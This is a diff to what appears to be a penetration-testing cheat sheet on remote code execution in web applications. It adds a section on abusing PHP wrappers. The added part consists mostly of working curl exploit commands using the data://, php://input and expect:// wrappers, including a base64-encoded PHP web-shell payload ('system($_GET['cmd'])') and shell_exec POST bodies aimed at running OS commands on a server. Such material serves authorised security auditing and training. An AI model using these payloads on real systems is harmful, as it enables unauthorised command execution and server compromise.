@@ -30,7 +30,8 @@
 - [Technique 2 - RCE using a Jenkins web-based groovy script console](#Technique-2-RCE-using-a-Jenkins-web-based-groovy-script-console)
 - [Technique 3 - RCE using a Liferay CMS web-based groovy script console](#Technique-3-RCE-using-a-Liferay-CMS-web-based-groovy-script-console)
 - [Technique 4 - RCE by exploiting ASP.NET ViewState deserialization in .NET Web applications](#Technique-4-RCE-by-exploiting-ASPNET-ViewState-deserialization-in-NET-Web-applications)
-- Technique 5. ...
+- [Technique 5 - RCE by exploiting PHP wrappers in PHP Web applications](#Technique-5-RCE-by-exploiting-PHP-wrappers-in-PHP-Web-applications)
+- Technique 6 - ...
 
 #### III. List of common paths for the DocumentRoot directory (Web root directory) [LINK](#III-List-of-common-paths-for-the-DocumentRoot-directory-Web-root-directory)
 #### IV. Usefull Github links for Webshells [LINK](#IV-Usefull-Github-links-for-Webshells)
@@ -691,7 +692,27 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 
 ➤ Step 5. Send an HTTP POST request with the generated "_ViewState=<signed-encrypted-payload-generated-with-yoserial>" to a Web page of the target Website to execute arbitrary OS command on the underlying Windows server
 ```
+#### Technique 5. RCE by exploiting PHP wrappers in PHP Web applications
+```
+➤ Example 1 - Wrapper 'data://'
+   + Requirement: The attribute allow_url_include must be set. This configuration can be checked in the php.ini file.
+   + Examples:
+           - curl --user-agent "AUDIT" "https://example.com/?parameter=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami"
+           - curl --user-agent "AUDIT" "https://example.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=dir"
+             NOTE: the payload is "<?php system($_GET['cmd']);?>"
 
+➤ Example 2 - Wrapper php://input
+   + Requirement: The attribute allow_url_include must be set. This configuration can be checked in the php.ini file.
+   + Examples:
+           - curl -X POST --data "<?php echo shell_exec('whoami'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
+           - curl -X POST --data "<?php echo shell_exec('whoami'); ?>" "https://example.com/index.php?parameter=php://input"
+
+➤ Example 3 - Wrapper php://expect
+   + Requirement: The expect wrapper doesn't required the allow_url_include configuration, the expect extension is required instead.
+   + Examples:
+           - curl --user-agent "AUDIT" "https://example.com/index.php?page=expect://whoami"
+           - curl --user-agent "AUDIT" "https://example.com/?parameter=expect://whoami"
+```
 
 -----------------
 
